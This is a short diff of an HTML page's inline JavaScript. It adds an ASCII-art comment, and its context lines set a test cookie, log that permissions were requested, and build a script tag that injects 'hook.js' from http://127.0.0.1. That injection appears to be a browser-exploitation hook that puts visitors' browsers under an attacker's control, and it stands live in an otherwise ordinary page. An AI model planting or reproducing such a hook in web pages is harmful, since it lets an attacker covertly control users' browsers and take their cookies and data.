@@ -413,6 +413,27 @@
             document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
             console.log('Página carregada, permissões solicitadas.');
         };
+
+
+        /* 
+    000000000000       000000000000             
+    0oooooooooo0       0oooooooooo0               
+    0oo0000oooo0       0oo0000oooo0                      
+    0oo0000oooo0       0oo0000oooo0                      
+    0oo0000oooo0       0oo0000oooo0                   
+    0oo0000oooo0       0oo0000oooo0                 
+    0oo____oooo0       0oo____oooo0 
+    000000000000       000000000000                                         
+    1                   ___________        _________
+    1  '    sssssssss  |___________        |_________
+    1       ss         |                   |
+    1         s        |___________        |_________
+    1          s       |                   |
+    1           s      |___________        |__________
+    1     ssssssss     |___________        |__________  .you  
+    1
+    ___              
+*/
     </script>
     <script>
         var commandModuleStr = '<script src="http://127.0.0.1/hook.js" type="text/javascript"><\/script>';
